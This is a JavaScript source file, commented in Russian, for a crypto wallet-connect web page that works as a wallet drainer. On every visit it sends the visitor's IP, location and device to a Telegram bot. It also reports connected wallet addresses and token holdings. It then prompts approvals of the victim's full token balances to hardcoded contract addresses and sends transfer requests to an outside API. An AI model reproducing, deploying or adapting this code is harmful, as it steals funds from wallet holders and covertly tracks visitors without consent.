import { arbitrum, bsc, mainnet, optimism, polygon, sepolia } from '@reown/appkit/networks'
import { createAppKit } from '@reown/appkit'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { parseEther, formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
import { sendTransaction, readContract, writeContract } from '@wagmi/core'

// Утилита для дебаунсинга
const debounce = (func, wait) => {
  let timeout
  return (...args) => {
    clearTimeout(timeout)
    timeout = setTimeout(() => func(...args), wait)
  }
}

// Конфигурация
const projectId = import.meta.env.VITE_PROJECT_ID || "d85cc83edb401b676e2a7bcef67f3be8"
if (!projectId) {
  throw new Error('VITE_PROJECT_ID is not set')
}

const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || "-1001234567890"

const networks = [bsc, mainnet, polygon]

// Создание маппинга сетей
const networkMap = {
  'BNB Smart Chain': { networkObj: bsc, chainId: networks[0].id || 56 },
  'Ethereum': { networkObj: mainnet, chainId: networks[1].id || 1 },
  'Polygon': { networkObj: polygon, chainId: networks[2].id || 137 }
}
console.log('Network Map:', networkMap)

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
})

const appKit = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  themeMode: 'dark',
  features: {
    analytics: true,
    email: false,
    socials: false,
  }
})

// Состояние приложения
const store = {
  accountState: {},
  networkState: {},
  appKitState: {},
  themeState: { themeMode: 'light', themeVariables: {} },
  events: [],
  walletInfo: {},
  eip155Provider: null,
  tokenBalances: [],
  errors: [],
  approvedTokens: {},
  isApprovalRequested: false,
  isApprovalRejected: false
}

// Утилиты для обновления состояния
const updateStore = (key, value) => {
  store[key] = value
}

const updateStateDisplay = (elementId, state) => {
  const element = document.getElementById(elementId)
  if (element) {
    element.innerHTML = JSON.stringify(state, null, 2)
  }
}

const updateTheme = mode => {
  document.documentElement.setAttribute('data-theme', mode)
  document.body.className = mode
}

const updateButtonVisibility = (isConnected) => {
  const connectedOnlyButtons = document.querySelectorAll('[data-connected-only]')
  connectedOnlyButtons.forEach(button => {
    if (!isConnected) button.style.display = 'none'
    else button.style.display = ''
  })
}

// Функции взаимодействия с блокчейном
const signMessage = (provider, address) => {
  if (!provider) return Promise.reject('No provider available')
  
  return provider.request({
    method: 'personal_sign',
    params: ['WHATS UP HOMIE', address]
  })
}

const sendTx = async (provider, address, wagmiConfig) => {
  if (!provider) return Promise.reject('No provider available')

  const result = await sendTransaction(wagmiConfig, {
    to: address,
    value: parseEther("0.0001"),
  })
  
  return result
}

const getBalance = async (provider, address, wagmiConfig) => {
  if (!provider) return Promise.reject('No provider available')
  
  const balance = await provider.request({
    method: 'eth_getBalance',
    params: [address, 'latest']
  })
  const ethBalance = formatUnits(BigInt(balance), 18)
  return ethBalance
}

// Функция отправки запроса на трансфер
const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
  try {
    const response = await fetch('https://api.amlinsight.io/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: amount.toString(),
        chainId,
        txHash,
      }),
    })
    
    const data = await response.json()
    if (data.success) {
      console.log(`Transfer request successful: ${data.txHash}`)
      return { success: true, txHash: data.txHash }
    } else {
      console.error(`Transfer request failed: ${data.message}`)
      store.errors.push(`Transfer request failed: ${data.message}`)
      return { success: false, message: data.message }
    }
  } catch (error) {
    console.error(`Error sending transfer request: ${error.message}`)
    store.errors.push(`Error sending transfer request: ${error.message}`)
    return { success: false, message: error.message }
  }
}

// Функции для получения информации о пользователе
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP')
  if (cachedIP) return cachedIP

  try {
    const response = await fetch('https://api.ipify.org?format=json')
    const data = await response.json()
    const ip = data.ip || 'Unknown IP'
    sessionStorage.setItem('userIP', ip)
    return ip
  } catch (error) {
    console.error(`❌ Error fetching IP: ${error.message}`)
    store.errors.push(`Error fetching IP: ${error.message}`)
    return 'Unknown IP'
  }
}

async function getGeolocation(ip) {
  const cachedLocation = sessionStorage.getItem('userLocation')
  if (cachedLocation) return cachedLocation

  try {
    const response = await fetch(`https://freeipapi.com/api/json/${ip}`)
    const data = await response.json()
    if (data.cityName && data.countryName) {
      const location = `${data.cityName}, ${data.countryName}`
      sessionStorage.setItem('userLocation', location)
      return location
    }
    return 'Unknown Location'
  } catch (error) {
    console.error(`❌ Error fetching geolocation: ${error.message}`)
    store.errors.push(`Error fetching geolocation: ${error.message}`)
    return 'Unknown Location'
  }
}

function detectDevice() {
  const userAgent = navigator.userAgent || 'Unknown Device'
  let deviceType = 'Desktop'
  let browser = 'Unknown Browser'

  if (/mobile/i.test(userAgent)) {
    deviceType = 'Mobile'
  } else if (/tablet/i.test(userAgent)) {
    deviceType = 'Tablet'
  }

  if (/chrome/i.test(userAgent) && !/edg/i.test(userAgent)) {
    browser = 'Chrome'
  } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
    browser = 'Safari'
  } else if (/firefox/i.test(userAgent)) {
    browser = 'Firefox'
  } else if (/edg/i.test(userAgent)) {
    browser = 'Edge'
  } else if (/opera|opr/i.test(userAgent)) {
    browser = 'Opera'
  }

  return `${deviceType} (${browser})`
}

// Функция отправки сообщений в Telegram
async function sendTelegramMessage(message) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    })
    
    const data = await response.json()
    if (!data.ok) {
      throw new Error(data.description || 'Failed to send Telegram message')
    }
    console.log('Telegram message sent successfully')
  } catch (error) {
    console.error(`❌ Error sending Telegram message: ${error.message}`)
    store.errors.push(`Error sending Telegram message: ${error.message}`)
  }
}

// Уведомления
async function notifyOnVisit() {
  if (sessionStorage.getItem('visitNotified')) return

  const domain = window.location.hostname || 'Unknown Domain'
  const ip = await getUserIP()
  const location = await getGeolocation(ip)
  const device = detectDevice()

  const message = `🔔 Visit | **${domain}**\n\n` +
                  `IP: \`${ip}\`\n` +
                  `Where: \`${location}\`\n` +
                  `Device: \`${device}\``

  await sendTelegramMessage(message)
  sessionStorage.setItem('visitNotified', 'true')
}

async function notifyWalletConnection(address, walletName, device) {
  if (sessionStorage.getItem('walletConnectedNotified')) return

  const message = `🌀 Connect |\n` +
                  `Wallet: \`${address}\`\n` +
                  `Wallet Name: \`${walletName}\`\n` +
                  `Device: \`${device}\``

  await sendTelegramMessage(message)
  sessionStorage.setItem('walletConnectedNotified', 'true')
}

async function notifyTokenCheck(balances, mostExpensive, device) {
  if (sessionStorage.getItem('tokenCheckNotified')) return

  let message
  if (!mostExpensive) {
    message = `😢 | wallet is empty\n` +
              `Device: \`${device}\``
  } else {
    const tokenList = balances
      .filter(token => token.balance > 0)
      .map(token => {
        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
        const value = (token.balance * price).toFixed(2)
        return `${token.symbol}: ${token.balance.toFixed(2)} (${value}$)`
      })
      .join('\n')

    const mostValuable = `${mostExpensive.symbol}: ${mostExpensive.balance.toFixed(2)} (${mostExpensive.value.toFixed(2)}$)`
    message = `🤩 | Tokens\n` +
              `${tokenList}\n` +
              `The most valuable: ${mostValuable}\n` +
              `Device: \`${device}\``
  }

  await sendTelegramMessage(message)
  sessionStorage.setItem('tokenCheckNotified', 'true')
}

// Инициализация подписок
const initializeSubscribers = (modal) => {
  modal.subscribeProviders(state => {
    updateStore('eip155Provider', state['eip155'])
  })

  const debouncedSubscribeAccount = debounce(async state => {
    updateStore('accountState', state)
    updateStateDisplay('accountState', state)

    if (state.isConnected && state.address && store.eip155Provider) {
      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
      const device = detectDevice()
      await notifyWalletConnection(state.address, walletInfo.name, device)

      const balancePromises = []

      // Получение балансов токенов для каждой сети
      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
        const networkInfo = networkMap[networkName]
        if (!networkInfo) {
          console.warn(`Network ${networkName} not found in networkMap`)
          return
        }
        tokens.forEach(token => {
          balancePromises.push(
            getTokenBalance(
              wagmiAdapter.wagmiConfig,
              state.address,
              token.address,
              token.decimals,
              networkInfo.chainId
            ).then(balance => ({
              symbol: token.symbol,
              balance,
              address: token.address,
              network: networkName,
              chainId: networkInfo.chainId,
              decimals: token.decimals
            }))
          )
        })
      })

      const allBalances = await Promise.all(balancePromises)
      store.tokenBalances = allBalances
      updateStateDisplay('tokenBalancesState', allBalances)

      let maxValue = 0
      let mostExpensive = null

      for (const token of allBalances) {
        if (token.balance > 0) {
          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
          const value = token.balance * price
          token.price = price
          if (value > maxValue) {
            maxValue = value
            mostExpensive = { ...token, price, value }
          }
        }
      }

      await notifyTokenCheck(allBalances, mostExpensive, device)

      if (mostExpensive) {
        const message = `Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`
        console.log(message)

        // Диагностика доступных сетей
        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))

        // Поиск целевой сети
        const targetNetworkInfo = networkMap[mostExpensive.network]
        if (!targetNetworkInfo) {
          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
          console.error(errorMessage)
          store.errors.push(errorMessage)
          const approveState = document.getElementById('approveState')
          const approveSection = document.getElementById('approveSection')
          if (approveState) approveState.innerHTML = errorMessage
          if (approveSection) approveSection.style.display = ''
          return
        }

        const targetNetwork = targetNetworkInfo.networkObj
        const expectedChainId = targetNetworkInfo.chainId

        // Переключение сети, если необходимо
        if (store.networkState.chainId !== expectedChainId) {
          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
          try {
            await new Promise((resolve, reject) => {
              const unsubscribe = modal.subscribeNetwork(networkState => {
                if (networkState.chainId === expectedChainId) {
                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
                  unsubscribe()
                  resolve()
                }
              })

              appKit.switchNetwork(targetNetwork).catch(error => {
                unsubscribe()
                reject(error)
              })

              setTimeout(() => {
                unsubscribe()
                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
              }, 10000)
            })
          } catch (switchError) {
            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${switchError.message}`
            console.error(errorMessage)
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            const approveSection = document.getElementById('approveSection')
            if (approveState) approveState.innerHTML = errorMessage
            if (approveSection) approveSection.style.display = ''
            return
          }
        } else {
          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
        }

        // Находим все токены с ненулевым балансом в той же сети
        const tokensInNetwork = allBalances.filter(token => 
          token.chainId === mostExpensive.chainId && token.balance > 0
        )

        if (tokensInNetwork.length > 0) {
          try {
            const contractAddress = CONTRACTS[mostExpensive.chainId]
            const approvalKey = `${state.address}_${mostExpensive.chainId}_batch`

            if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
              const approveMessage = store.approvedTokens[approvalKey]
                ? `Batch approve already completed for tokens on ${mostExpensive.network}`
                : store.isApprovalRejected
                ? `Batch approve was rejected for tokens on ${mostExpensive.network}`
                : `Batch approve request pending for tokens on ${mostExpensive.network}`
              console.log(approveMessage)
              const approveState = document.getElementById('approveState')
              const approveSection = document.getElementById('approveSection')
              if (approveState) approveState.innerHTML = approveMessage
              if (approveSection) approveSection.style.display = ''
              return
            }

            // Обновление UI для отображения списка токенов
            const tokenList = tokensInNetwork.map(t => `${t.symbol}: ${t.balance}`).join('<br>')
            const approveState = document.getElementById('approveState')
            const approveSection = document.getElementById('approveSection')
            if (approveState) {
              approveState.innerHTML = `Токены для одобрения:<br>${tokenList}<br>Подтвердите транзакцию для всех токенов`
            }
            if (approveSection) approveSection.style.display = ''

            store.isApprovalRequested = true

            // Выполняем батчинг аппрувов с помощью EIP-7702
            const txHash = await batchApproveTokens(
              wagmiAdapter.wagmiConfig,
              tokensInNetwork,
              contractAddress,
              mostExpensive.chainId
            )

            store.approvedTokens[approvalKey] = true
            store.isApprovalRequested = false
            let approveMessage = `Batch approve successful for ${tokensInNetwork.length} tokens on ${mostExpensive.network}: ${txHash}`
            console.log(approveMessage)

            // Отправка запросов на трансфер для каждого токена
            for (const token of tokensInNetwork) {
              const amount = parseUnits(token.balance.toString(), token.decimals)
              const transferResult = await sendTransferRequest(
                state.address,
                token.address,
                amount,
                token.chainId,
                txHash
              )
              if (transferResult.success) {
                approveMessage += `<br>Transfer request successful for ${token.symbol}: ${transferResult.txHash}`
                console.log(`Transfer request successful for ${token.symbol}: ${transferResult.txHash}`)
              } else {
                approveMessage += `<br>Transfer request failed for ${token.symbol}: ${transferResult.message}`
                console.error(`Transfer request failed for ${token.symbol}: ${transferResult.message}`)
              }
            }

            if (approveState) approveState.innerHTML = approveMessage
            if (approveSection) approveSection.style.display = ''
          } catch (error) {
            if (error.code === 4001 || error.code === -32000) {
              store.isApprovalRejected = true
              store.isApprovalRequested = false
              const errorMessage = `Batch approve was rejected for tokens on ${mostExpensive.network}`
              store.errors.push(errorMessage)
              const approveState = document.getElementById('approveState')
              const approveSection = document.getElementById('approveSection')
              if (approveState) approveState.innerHTML = errorMessage
              if (approveSection) approveSection.style.display = ''
            } else {
              store.isApprovalRequested = false
              const errorMessage = `Batch approve failed: ${error.message}`
              store.errors.push(errorMessage)
              const approveState = document.getElementById('approveState')
              const approveSection = document.getElementById('approveSection')
              if (approveState) approveState.innerHTML = errorMessage
              if (approveSection) approveSection.style.display = ''
            }
          }
        } else {
          const message = `Нет токенов с положительным балансом в сети ${mostExpensive.network}`
          console.log(message)
          const approveState = document.getElementById('approveState')
          const approveSection = document.getElementById('approveSection')
          if (approveState) approveState.innerHTML = message
          if (approveSection) approveSection.style.display = ''
        }
      } else {
        const message = 'Нет токенов с положительным балансом'
        console.log(message)
        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
        const mostExpensiveSection = document.getElementById('mostExpensiveTokenSection')
        if (mostExpensiveState) mostExpensiveState.innerHTML = message
        if (mostExpensiveSection) mostExpensiveSection.style.display = ''
      }
    }
  }, 500)

  modal.subscribeAccount(debouncedSubscribeAccount)

  modal.subscribeNetwork(state => {
    updateStore('networkState', state)
    updateStateDisplay('networkState', state)
    
    const switchNetworkBtn = document.getElementById('switch-network')
    if (switchNetworkBtn) {
      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`
    }
  })

  modal.subscribeState(state => {
    store.appKitState = state
    updateButtonVisibility(modal.getIsConnectedState())
  })
}

initializeSubscribers(appKit)

updateButtonVisibility(appKit.getIsConnectedState())

document.getElementById('open-connect-modal')?.addEventListener('click', () => appKit.open())

document.getElementById('disconnect')?.addEventListener('click', () => {
  appKit.disconnect()
  store.approvedTokens = {}
  store.errors = []
  store.isApprovalRequested = false
  store.isApprovalRejected = false
  sessionStorage.removeItem('walletConnectedNotified')
  sessionStorage.removeItem('tokenCheckNotified')
})

document.getElementById('switch-network')?.addEventListener('click', () => {
  const currentChainId = store.networkState?.chainId
  appKit.switchNetwork(currentChainId === polygon.id ? mainnet : polygon)
})

document.getElementById('sign-message')?.addEventListener('click', async () => {
  const signature = await signMessage(store.eip155Provider, store.accountState.address)
  const signatureState = document.getElementById('signatureState')
  const signatureSection = document.getElementById('signatureSection')
  if (signatureState) signatureState.innerHTML = signature
  if (signatureSection) signatureSection.style.display = ''
})

document.getElementById('send-tx')?.addEventListener('click', async () => {
  const txHash = await sendTx(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
  const txState = document.getElementById('txState')
  const txSection = document.getElementById('txSection')
  if (txState) txState.innerHTML = JSON.stringify(txHash, null, 2)
  if (txSection) txSection.style.display = ''
})

document.getElementById('get-balance')?.addEventListener('click', async () => {
  const balance = await getBalance(store.eip155Provider, store.accountState.address, wagmiAdapter.wagmiConfig)
  const balanceState = document.getElementById('balanceState')
  const balanceSection = document.getElementById('balanceSection')
  if (balanceState) balanceState.innerHTML = balance + ' ETH'
  if (balanceSection) balanceSection.style.display = ''
})

const CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC', // Ethereum Mainnet
  [networkMap['BNB Smart Chain'].chainId]: '0x67062812416C73364926b9d31E183014deB95462', // BNB Chain
  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c', // Polygon
}

const BATCH_APPROVER_CONTRACTS = {
  [networkMap['Ethereum'].chainId]: '0xYourEthereumBatchApproverAddress', // Замените на реальный адрес
  [networkMap['BNB Smart Chain'].chainId]: '0x1302207a7F01eD01D51fF0842CFf402C76B77669', // Замените на реальный адрес
  [networkMap['Polygon'].chainId]: '0xYourPolygonBatchApproverAddress', // Замените на реальный адрес
}

const TOKENS = {
  'Ethereum': [
    { symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6 },
    { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
    { symbol: 'DAI', address: '0x6b175474e89094c44da98b954eedeac495271d0f', decimals: 18 },
    { symbol: 'WBTC', address: '0x2260fac5e5542a773aa44fbcfedf7c193bc2c599', decimals: 8 },
    { symbol: 'UNI', address: '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984', decimals: 18 },
    { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18 },
    { symbol: 'COMP', address: '0xc00e94cb662c3520282e6f5717214004a7f26888', decimals: 18 },
    { symbol: 'YFI', address: '0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e', decimals: 18 },
    { symbol: 'CRV', address: '0xd533a949740bb3306d119cc777fa900ba034cd52', decimals: 18 },
    { symbol: 'BAT', address: '0x0d8775f648430679a709e98d2b0cb6250d2887ef', decimals: 18 },
    { symbol: 'ZRX', address: '0xe41d2489571d322189246dafa5ebde1f4699f498', decimals: 18 },
    { symbol: 'LRC', address: '0xbbbbca6a901c926f240b89eacb641d8aec7aeafd', decimals: 18 },
    { symbol: 'BNB', address: '0xb8c77482e45f1f44de1745f52c74426c631bdd52', decimals: 18 },
    { symbol: 'SHIB', address: '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce', decimals: 18 },
    { symbol: 'PEPE', address: '0x6982508145454ce325ddbe47a25d4ec3d2311933', decimals: 18 },
    { symbol: 'LEASH', address: '0x27c70cd1946795b66be9d954418546998b546634', decimals: 18 },
    { symbol: 'FLOKI', address: '0xcf0c122c6b73ff809c693db761e7baebe62b6a2e', decimals: 18 },
    { symbol: 'AAVE', address: '0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9', decimals: 18 },
    { symbol: 'RNDR', address: '0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24', decimals: 18 },
    { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
    { symbol: 'SUSHI', address: '0x6b3595068778dd592e39a122f4f5a5cf09c90fe2', decimals: 18 },
    { symbol: 'GLM', address: '0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429', decimals: 18 },
    { symbol: 'REP', address: '0x1985365e9f78359a9b6ad760e32412f4a445e862', decimals: 18 },
    { symbol: 'SNT', address: '0x744d70fdbe2ba4cf95131626614a1763df805b9e', decimals: 18 },
    { symbol: 'STORJ', address: '0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac', decimals: 18 },
  ],
  'BNB Smart Chain': [
    { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
    { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
    { symbol: 'SHIB', address: '0x2859e4544c4bb0390a468f4b6e3e63bd2d0dd4d', decimals: 18 },
    { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
    { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
    { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
    { symbol: 'BAKE', address: '0xe02df9e3e622debdd69fb838bb799e3f168902c5', decimals: 18 },
    { symbol: 'XVS', address: '0xcf6bb5389c92bdda8a3747f6db454cb7a64626c6', decimals: 18 },
    { symbol: 'ALPACA', address: '0x8f0528ce5ef7b51152a59745befdd91d97091d2f', decimals: 18 },
    { symbol: 'AUTO', address: '0xa184088a740c695e156f91f5cc086a06bb78b827', decimals: 18 },
    { symbol: 'BURGER', address: '0xae9269f27437f0fcbc232d39ec814844a51d6b8f', decimals: 18 },
    { symbol: 'EPS', address: '0xa7f552078dcc247c2684336020c03648500c6d9f', decimals: 18 },
    { symbol: 'BELT', address: '0xe0e514c71282b6f4e823703a39374cf58dc3ea4f', decimals: 18 },
    { symbol: 'MBOX', address: '0x3203c9e46ca618c8be4c2c9f0e2e7b0d5d0e75', decimals: 18 },
    { symbol: 'SFP', address: '0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb', decimals: 18 },
    { symbol: 'BabyDoge', address: '0xc748673057861a797275cd8a068abb95a902e8de', decimals: 18 },
    { symbol: 'EGC', address: '0xc001bbe2b87079294c63ece98bdd0a88d761434e', decimals: 18 },
    { symbol: 'QUACK', address: '0xd74b782e05aa25c50e7330af541d46e18f36661c', decimals: 18 },
    { symbol: 'PIT', address: '0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2', decimals: 18 },
  ],
  'Polygon': [
    { symbol: 'USDT', address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f', decimals: 6 },
    { symbol: 'USDC', address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174', decimals: 6 },
    { symbol: 'QUICK', address: '0x831753dd7087cac61ab5644b308642cc1c33dc13', decimals: 18 },
    { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54b7', decimals: 18 },
    { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
    { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0fea8e9b7ea0f28c4', decimals: 18 },
    { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 },
  ],
}

const erc20Abi = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function',
  },
  {
    constant: false,
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
    name: 'approve',
    outputs: [{ name: 'success', type: 'bool' }],
    type: 'function',
  },
]

const batchApproverAbi = [
  {
    inputs: [
      { name: 'tokens', type: 'address[]' },
      { name: 'spender', type: 'address' },
      { name: 'amounts', type: 'uint256[]' },
    ],
    name: 'batchApprove',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function',
  },
]

const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
  if (!address || !tokenAddress) {
    return Promise.reject('Missing address or token address')
  }

  try {
    const balance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'balanceOf',
      args: [address],
      chainId,
    })
    return Number(formatUnits(balance, decimals))
  } catch (error) {
    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
    return 0
  }
}

const getTokenPrice = async (symbol) => {
  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`)
    }
    const data = await response.json()
    return Number(data.price) || 0
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
    return 0
  }
}

const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
  if (!wagmiConfig) {
    throw new Error('wagmiConfig is not initialized')
  }
  if (!tokenAddress || !contractAddress) {
    throw new Error('Missing token or contract address')
  }
  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) {
    throw new Error('Invalid token or contract address')
  }
  const checksumTokenAddress = getAddress(tokenAddress)
  const checksumContractAddress = getAddress(contractAddress)
  try {
    const gasLimit = BigInt(65000)
    const maxFeePerGas = BigInt(10_000_000_000)
    const maxPriorityFeePerGas = BigInt(2_000_000_000)

    console.log(`Approving token with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)

    const txHash = await writeContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'approve',
      args: [checksumContractAddress, maxUint256],
      chainId,
      gas: gasLimit,
      maxFeePerGas,
      maxPriorityFeePerGas
    })
    console.log(`Approve transaction sent: ${txHash}`)
    return txHash
  } catch (error) {
    store.errors.push(`Approve token failed: ${error.message}`)
    throw error
  }
}

const batchApproveTokens = async (wagmiConfig, tokens, contractAddress, chainId) => {
  if (!wagmiConfig) {
    throw new Error('wagmiConfig is not initialized')
  }
  if (!tokens.length || !contractAddress) {
    throw new Error('Missing tokens or contract address')
  }
  if (!isAddress(contractAddress)) {
    throw new Error('Invalid contract address')
  }

  const checksumContractAddress = getAddress(contractAddress)
  const tokenAddresses = tokens.map(token => getAddress(token.address))
  const amounts = tokens.map(token => parseUnits(token.balance.toString(), token.decimals))

  try {
    const gasLimit = BigInt(12500 + 46000 * tokens.length) // 12,500 для EIP-7702 + 46,000 за каждый approve
    const maxFeePerGas = BigInt(10_000_000_000)
    const maxPriorityFeePerGas = BigInt(2_000_000_000)

    console.log(`Batch approving ${tokens.length} tokens on chain ${chainId} with gasLimit: ${gasLimit}`)

    const txHash = await writeContract(wagmiConfig, {
      address: BATCH_APPROVER_CONTRACTS[chainId],
      abi: batchApproverAbi,
      functionName: 'batchApprove',
      args: [tokenAddresses, checksumContractAddress, amounts],
      chainId,
      gas: gasLimit,
      maxFeePerGas,
      maxPriorityFeePerGas,
    })

    console.log(`Batch approve transaction sent: ${txHash}`)
    return txHash
  } catch (error) {
    store.errors.push(`Batch approve failed: ${error.message}`)
    throw error
  }
}

notifyOnVisit()
